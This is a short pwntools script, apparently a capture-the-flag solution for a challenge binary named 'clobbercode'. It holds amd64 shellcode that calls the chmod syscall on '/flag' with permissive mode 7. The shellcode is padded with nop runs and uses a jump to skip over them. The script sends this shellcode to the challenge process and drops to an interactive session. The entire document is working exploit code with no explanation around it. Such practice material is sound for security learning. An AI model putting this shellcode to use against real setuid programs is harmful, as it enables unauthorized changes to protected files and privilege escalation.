#!/usr/bin/python3

from pwn import *

#context.terminal = ['tmux', 'splitw', '-h']
context.log_level = 'error'
context.arch = "amd64"
elf = context.binary = ELF('/challenge/clobbercode')

#shellcode = open("shellcode_raw","rb").read()
shellcode = asm("""
mov al, 90
push 7
add rdx, 20
jmp rdx
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
pop rsi
lea rdi, [rdx+20]
syscall
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
filename:
        .string "/flag"
""")

io = process()

io.send(shellcode)
io.interactive()
